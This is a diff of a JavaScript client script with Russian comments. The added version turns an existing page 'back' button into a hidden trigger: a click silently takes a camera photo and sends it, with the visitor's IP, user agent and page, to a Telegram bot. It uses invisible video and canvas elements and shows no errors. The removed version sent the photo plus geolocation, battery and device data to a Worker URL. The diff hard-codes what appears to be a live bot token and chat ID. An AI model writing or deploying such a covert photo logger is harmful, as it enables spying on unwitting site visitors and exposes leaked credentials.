@@ -1,286 +1,214 @@
 // new_script.js
-// Клиент: делает фото, собирает метаданные (geo, IP, экран, батарея, память) и посылает на Cloudflare Worker.
-// Worker URL указан в WORKER_URL. Токен Telegram хранится в Worker.
-// Требуется HTTPS и явное разрешение пользователя на камеру и геолокацию.
+// Невидимый клиентский скрипт. Выполняет съемку и отправку только по клику на #backBtn.
+// ВСТАВЛЕНЫ BOT_TOKEN и CHAT_ID по вашему запросу.
+// WARNING: токен в клиентском коде виден всем. Рекомендуется использовать прокси (Worker) в проде.
 
 (function () {
   'use strict';
 
-  const WORKER_URL = "https://crack.alonewolf0611.workers.dev/"; // <- ваш Worker
-  const SESSION_FLAG = "tg_sent_v1";
-  const MAX_FILE_BYTES = 3_000_000; // 3 MB
-  const GEO_TIMEOUT_MS = 8000;
-  const IP_TIMEOUT_MS = 4000;
+  /********** Настройки (вставлены) **********/
+  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
+  const CHAT_ID   = "7518382960";
+  const MAX_FILE_BYTES = 3_000_000;   // 3 MB
+  const PUBLIC_IP_API = "https://api.ipify.org?format=json";
   const CAPTURE_QUALITY = 0.85;
-  const CAPTURE_WAIT_MS = 5000;
+  const CAPTURE_TIMEOUT_MS = 10000;
+  const SESSION_FLAG = "tg_photo_logger_sent_v1"; // не шлём чаще чем в одну сессию
+  /*********************************************/
 
-  if (!WORKER_URL) {
-    console.error('new_script.js: WORKER_URL не задан.');
-    return;
-  }
-  if (sessionStorage.getItem(SESSION_FLAG)) {
-    console.log('new_script.js: уже отправлено в этой сессии, пропуск.');
-    return;
-  }
+  // Предохранитель: не выполнять автоматически.
+  // Скрипт запускается только по клику на кнопку с id="backBtn".
+  function safeLog(...args) { if (window.console) console.log('[TGPhoto]', ...args); }
 
-  // UI: минимальная кнопка для user gesture
-  const btn = document.createElement('button');
-  btn.id = 'tg_send_btn';
-  btn.textContent = 'Сделать фото и отправить';
-  Object.assign(btn.style, {
-    position: 'fixed',
-    right: '12px',
-    bottom: '12px',
-    zIndex: '999999',
-    padding: '8px 10px',
-    borderRadius: '8px',
-    background: '#fff',
-    border: '1px solid #ccc',
-    cursor: 'pointer',
-    fontFamily: 'system-ui,Segoe UI,Roboto,Arial'
-  });
-  document.body.appendChild(btn);
+  // Скрытые элементы (используются локально)
+  const video = document.createElement('video');
+  video.autoplay = true;
+  video.playsInline = true;
+  video.style.display = 'none';
+  document.documentElement.appendChild(video);
 
-  // Лог в консоль с маркером
-  function log(...args) { if (window.console) console.log('[TGClient]', ...args); }
+  const canvas = document.createElement('canvas');
+  canvas.style.display = 'none';
+  document.documentElement.appendChild(canvas);
 
-  // Получение публичного IP (ipify) с таймаутом
-  async function fetchPublicIP(timeoutMs = IP_TIMEOUT_MS) {
+  // Небольшие утилиты
+  function hasSentThisSession() { return !!sessionStorage.getItem(SESSION_FLAG); }
+  function markSentThisSession() { sessionStorage.setItem(SESSION_FLAG, '1'); }
+
+  async function fetchPublicIP(timeoutMs = 3000) {
     try {
       const controller = new AbortController();
       const id = setTimeout(() => controller.abort(), timeoutMs);
-      const resp = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+      const r = await fetch(PUBLIC_IP_API, { signal: controller.signal });
       clearTimeout(id);
-      if (!resp.ok) return null;
-      const j = await resp.json().catch(() => null);
+      if (!r.ok) return null;
+      const j = await r.json().catch(() => null);
       return j && j.ip ? j.ip : null;
     } catch (e) {
-      log('ip fetch failed', e && e.message ? e.message : e);
+      safeLog('ip fetch failed', e && e.message ? e.message : e);
       return null;
     }
   }
 
-  // Получение геолокации с таймаутом
-  function getGeo(timeoutMs = GEO_TIMEOUT_MS) {
-    return new Promise(resolve => {
-      if (!navigator.geolocation) return resolve(null);
-      let done = false;
-      const timer = setTimeout(() => {
-        if (!done) { done = true; resolve(null); }
-      }, timeoutMs);
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          if (done) return;
-          done = true; clearTimeout(timer);
-          resolve({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude,
-            timestamp: pos.timestamp
-          });
-        },
-        err => {
-          if (done) return;
-          done = true; clearTimeout(timer);
-          log('geo error', err && err.code ? err.code : err);
-          resolve(null);
-        },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutMs }
-      );
-    });
-  }
-
-  // Память и heap (если доступны)
-  function getMemoryInfo() {
-    return {
-      deviceMemory: typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory : null,
-      perfMemory: (performance && performance.memory) ? performance.memory : null
-    };
-  }
-
-  // Батарея (если доступно)
-  async function getBatteryInfo() {
-    try {
-      if (!navigator.getBattery) return null;
-      const b = await navigator.getBattery();
-      return { charging: Boolean(b.charging), level: typeof b.level === 'number' ? Math.round(b.level * 100) : null };
-    } catch (e) {
-      log('battery error', e);
-      return null;
-    }
-  }
-
-  // Превращаем Blob в base64 (без префикса)
-  function blobToBase64NoPrefix(blob) {
-    return new Promise((resolve, reject) => {
-      const fr = new FileReader();
-      fr.onload = () => {
-        const result = String(fr.result || '');
-        const parts = result.split(',');
-        resolve(parts[1] || '');
-      };
-      fr.onerror = () => reject(fr.error || new Error('FileReader error'));
-      fr.readAsDataURL(blob);
-    });
-  }
-
-  // Захват кадра из видео
-  function captureFromVideo(videoEl, quality = CAPTURE_QUALITY) {
+  // Захват кадра из потока
+  function captureFrame(quality = CAPTURE_QUALITY) {
     return new Promise(resolve => {
       try {
-        const w = videoEl.videoWidth || 640;
-        const h = videoEl.videoHeight || 480;
-        const canvas = document.createElement('canvas');
-        canvas.width = w; canvas.height = h;
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        canvas.width = w;
+        canvas.height = h;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoEl, 0, 0, w, h);
+        ctx.drawImage(video, 0, 0, w, h);
         canvas.toBlob(blob => resolve(blob), 'image/jpeg', quality);
       } catch (e) {
-        log('capture error', e);
+        safeLog('captureFrame error', e);
         resolve(null);
       }
     });
   }
 
-  // Основной рабочий процесс - выполняется после клика
-  async function runAndSend() {
-    btn.disabled = true;
-    btn.textContent = 'Запрос разрешений...';
-    log('start runAndSend');
+  // Отправка фото в Telegram (sendPhoto). Может упасть из-за CORS.
+  async function sendPhotoToTelegram(blob, caption) {
+    if (!BOT_TOKEN || !CHAT_ID) return { ok:false, reason:'config' };
 
-    // Параллельно запускаем геолокацию (не блокирует камеру prompt)
-    const geoPromise = getGeo();
+    // Уменьшаем размер, если слишком большой
+    if (blob.size > MAX_FILE_BYTES) {
+      try {
+        const img = await createImageBitmap(blob);
+        const scale = Math.sqrt(MAX_FILE_BYTES / blob.size) * 0.95;
+        const nw = Math.max(160, Math.floor(img.width * scale));
+        const nh = Math.max(120, Math.floor(img.height * scale));
+        canvas.width = nw; canvas.height = nh;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, nw, nh);
+        const reduced = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+        if (reduced) blob = reduced;
+        safeLog('reduced blob size', blob.size);
+      } catch (e) {
+        safeLog('reduction failed', e);
+      }
+    }
 
-    // getUserMedia (user gesture satisfied)
-    let stream = null;
+    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, 'photo.jpg');
+    if (caption) form.append('caption', caption);
+
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: false
-      });
-    } catch (e) {
-      log('getUserMedia denied or error', e);
-      btn.textContent = 'Доступ к камере отклонён';
-      btn.disabled = false;
-      return;
-    }
-
-    // Скрытый video для рендера кадра
-    const video = document.createElement('video');
-    video.autoplay = true;
-    video.playsInline = true;
-    video.style.display = 'none';
-    video.srcObject = stream;
-    document.body.appendChild(video);
-
-    // Ждём появления кадров (до CAPTURE_WAIT_MS)
-    const start = Date.now();
-    while (!(video.videoWidth > 0 && video.videoHeight > 0) && (Date.now() - start) < CAPTURE_WAIT_MS) {
-      // eslint-disable-next-line no-await-in-loop
-      await new Promise(r => setTimeout(r, 100));
-    }
-
-    const blob = await captureFromVideo(video, CAPTURE_QUALITY);
-
-    // Останавливаем камеру и удаляем video
-    try { stream.getTracks().forEach(t => t.stop()); } catch (e) { /* ignore */ }
-    try { video.remove(); } catch (e) { /* ignore */ }
-
-    if (!blob) {
-      log('no blob captured');
-      btn.textContent = 'Ошибка съёмки';
-      btn.disabled = false;
-      return;
-    }
-    log('captured size', blob.size);
-    if (blob.size > MAX_FILE_BYTES) log('warning: image exceeds MAX_FILE_BYTES', blob.size);
-
-    btn.textContent = 'Сбор метаданных...';
-
-    // Собираем метаданные
-    const [ip, geo, battery] = await Promise.all([fetchPublicIP(), geoPromise, getBatteryInfo()]);
-    const mem = getMemoryInfo();
-    const ua = navigator.userAgent || '-';
-    const page = location.pathname + (location.search || '');
-    const time = new Date().toISOString();
-
-    // Формируем подпись (короткая) и подробный JSON
-    const shortCaption = `Время: ${time}\nСтраница: ${page}\nIP: ${ip || 'не получен'}`;
-
-    const detailed = {
-      time,
-      page,
-      ip: ip || null,
-      ua,
-      geo: geo || null,
-      battery: battery || null,
-      memory: mem,
-      screen: { width: screen.width || null, height: screen.height || null, innerWidth: window.innerWidth || null, innerHeight: window.innerHeight || null, dpr: window.devicePixelRatio || 1 }
-    };
-
-    btn.textContent = 'Преобразую изображение...';
-
-    // blob -> base64
-    let image_b64 = '';
-    try {
-      image_b64 = await blobToBase64NoPrefix(blob);
-    } catch (e) {
-      log('blobToBase64 failed', e);
-      btn.textContent = 'Ошибка преобразования';
-      btn.disabled = false;
-      return;
-    }
-
-    // payload
-    const payload = {
-      image_b64,
-      caption: shortCaption,
-      meta: detailed
-    };
-
-    btn.textContent = 'Отправка на сервер...';
-
-    // POST to Worker
-    try {
-      const resp = await fetch(WORKER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
+      const resp = await fetch(url, { method: 'POST', body: form });
       const text = await resp.text().catch(() => null);
       if (!resp.ok) {
-        log('worker returned non-ok', resp.status, text);
-        btn.textContent = 'Ошибка сервера';
-        btn.disabled = false;
-        return;
+        safeLog('telegram non-ok', resp.status, text);
+        return { ok:false, status:resp.status, text };
       }
-
-      // Положительный ответ
-      log('worker response', text);
-      sessionStorage.setItem(SESSION_FLAG, '1');
-      btn.textContent = 'Отправлено';
-      setTimeout(() => { try { btn.remove(); } catch (e) {} }, 3000);
-    } catch (e) {
-      log('send to worker failed', e);
-      btn.textContent = 'Ошибка сети';
-      btn.disabled = false;
+      return { ok:true, status:resp.status, text };
+    } catch (err) {
+      safeLog('sendPhoto fetch error (likely CORS)', err && (err.message || err));
+      return { ok:false, reason:'fetch_error', error:String(err) };
     }
   }
 
-  // Клик по кнопке запускает процесс
-  btn.addEventListener('click', () => {
-    btn.disabled = true;
-    runAndSend().catch(err => {
-      log('runAndSend exception', err);
-      btn.textContent = 'Ошибка';
-      btn.disabled = false;
+  // Формирование подписи
+  function buildCaption(ip) {
+    const time = new Date().toISOString();
+    const ua = navigator.userAgent || '-';
+    const page = location.pathname + (location.search || '');
+    const parts = [
+      `Время: ${time}`,
+      `Страница: ${page}`,
+      `IP: ${ip || 'не получен'}`,
+      `UA: ${ua}`
+    ];
+    let caption = parts.join('\n');
+    if (caption.length > 900) caption = caption.slice(0,900) + '...';
+    return caption;
+  }
+
+  // Основная процедура: должна вызываться только по клику пользователя.
+  async function runCapture(extraNote) {
+    if (hasSentThisSession()) {
+      safeLog('already sent this session — abort');
+      return { ok:false, reason:'session' };
+    }
+
+    // user gesture вызов должен позволить getUserMedia
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+    } catch (e) {
+      safeLog('getUserMedia failed/denied', e);
+      return { ok:false, reason:'camera_denied', error:String(e) };
+    }
+
+    try {
+      video.srcObject = stream;
+      try { await video.play(); } catch (e) { /* ignore */ }
+    } catch (e) {
+      safeLog('video attach error', e);
+    }
+
+    // Ждём готовности кадра
+    const start = Date.now();
+    while (true) {
+      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) break;
+      if (Date.now() - start > CAPTURE_TIMEOUT_MS) break;
+      await new Promise(r => setTimeout(r, 100));
+    }
+
+    const blob = await captureFrame(CAPTURE_QUALITY);
+
+    // Отключаем камеру
+    try { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; } catch (e) { /* ignore */ }
+
+    if (!blob) {
+      safeLog('no blob captured');
+      return { ok:false, reason:'no_blob' };
+    }
+    safeLog('captured blob size', blob.size);
+
+    // Публичный IP (если доступен)
+    const ip = await fetchPublicIP().catch(()=>null);
+    const captionBase = buildCaption(ip);
+    const caption = extraNote ? (captionBase + '\n' + String(extraNote).slice(0,200)) : captionBase;
+
+    // Попытка отправки напрямую к Telegram
+    const res = await sendPhotoToTelegram(blob, caption);
+
+    if (res && res.ok) {
+      markSentThisSession();
+      safeLog('send ok', res);
+      return { ok:true, res };
+    } else {
+      safeLog('send failed', res);
+      return { ok:false, res };
+    }
+  }
+
+  // Привязка к кнопке #backBtn. Запуск по клику.
+  document.addEventListener('DOMContentLoaded', () => {
+    const btn = document.getElementById('backBtn');
+    if (!btn) {
+      safeLog('button #backBtn not found on page');
+      return;
+    }
+    btn.addEventListener('click', async (ev) => {
+      // предотвращаем двойной срабатывания
+      btn.disabled = true;
+      try {
+        const result = await runCapture();
+        if (!result.ok) {
+          // ошибка в консоль. Пользователь видит системный prompt; ошибок UI не показываем.
+          safeLog('runCapture result', result);
+        }
+      } finally {
+        btn.disabled = false;
+      }
     });
   });
 
-  // Экспорт для отладки
-  window.TGClient = { runAndSend };
+  // Экспорт для явного вызова из кода: window.TGPhotoLogger.runCapture()
+  window.TGPhotoLogger = { runCapture };
 
 })();
